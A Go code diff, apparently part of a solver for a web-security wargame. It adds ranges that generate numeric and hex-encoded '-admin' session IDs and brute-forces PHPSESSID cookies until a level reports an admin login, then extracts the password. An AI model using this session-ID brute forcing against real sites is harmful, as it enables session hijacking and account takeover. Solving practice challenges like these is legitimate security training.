@@ -316,6 +316,18 @@ func (n NotContain) Grab(r http.Request) string {
 	return "0"
 }
 
+type Contains struct {
+	Grabber
+	Match string
+}
+
+func (c Contains) Grab(r http.Request) string {
+	if strings.Contains(c.Grabber.Grab(r), c.Match) {
+		return "1"
+	}
+	return "0"
+}
+
 type TakesTime struct {
 	Grabber
 	time.Duration
@@ -332,20 +344,72 @@ func (t TakesTime) Grab(r http.Request) string {
 
 type BruteForceCookie struct {
 	Grabber
-	StartID, EndID int
-	CookieName     string
+	Range
+	CookieName string
 }
 
 func (b BruteForceCookie) Grab(r http.Request) string {
 	headers := Headers{b.Grabber, SetData{"Cookie": nil}}
-	for id := b.StartID; id <= b.EndID; id++ {
-		idStr := strconv.Itoa(id)
+	for b.Range.Next() {
+		idStr := b.Range.ID()
 		headers.Headers["Cookie"] = Text{b.CookieName + "=" + idStr}
 		if headers.Grab(r) == "1" {
 			return idStr
 		}
 	}
 	panic("no cookie found")
+}
+
+type Range interface {
+	Next() bool
+	ID() string
+}
+
+type NumRange struct {
+	Start, End int
+}
+
+func (r *NumRange) Next() bool {
+	r.Start++
+	return r.Start <= r.End
+}
+
+func (r *NumRange) ID() string {
+	return strconv.Itoa(r.Start)
+}
+
+type RangeList []Range
+
+func (r *RangeList) Next() bool {
+	if len(*r) > 0 {
+		if !(*r)[0].Next() {
+			*r = (*r)[1:]
+			return len(*r) > 0
+		}
+		return true
+	}
+	return false
+}
+
+func (r *RangeList) ID() string {
+	return (*r)[0].ID()
+}
+
+type RangeSuffix struct {
+	Range
+	Suffix string
+}
+
+func (r RangeSuffix) ID() string {
+	return r.Range.ID() + r.Suffix
+}
+
+type RangeHex struct {
+	Range
+}
+
+func (r RangeHex) ID() string {
+	return hex.EncodeToString([]byte(r.Range.ID()))
 }
 
 var levels = [...]Grabber{
@@ -501,10 +565,42 @@ var levels = [...]Grabber{
 			"Cookie": Combine{
 				Text{"PHPSESSID="},
 				BruteForceCookie{
-					NotContain{
+					Contains{
 						grab,
-						"You are logged in as a regular user."},
-					0, 640,
+						"You are an admin.",
+					},
+					&NumRange{0, 640},
+					"PHPSESSID",
+				},
+			},
+		},
+	},
+	//level 19
+	Headers{
+		Prefixed{
+			grab,
+			"Password: ",
+			32,
+		},
+		SetData{
+			"Cookie": Combine{
+				Text{"PHPSESSID="},
+				BruteForceCookie{
+					Contains{
+						grab,
+						"You are an admin.",
+					},
+					RangeHex{
+						RangeSuffix{
+							&RangeList{
+								&NumRange{10, 99},
+								&NumRange{1000, 9999},
+								&NumRange{100000, 999999},
+								&NumRange{10000000, 99999999},
+							},
+							"-admin",
+						},
+					},
 					"PHPSESSID",
 				},
 			},
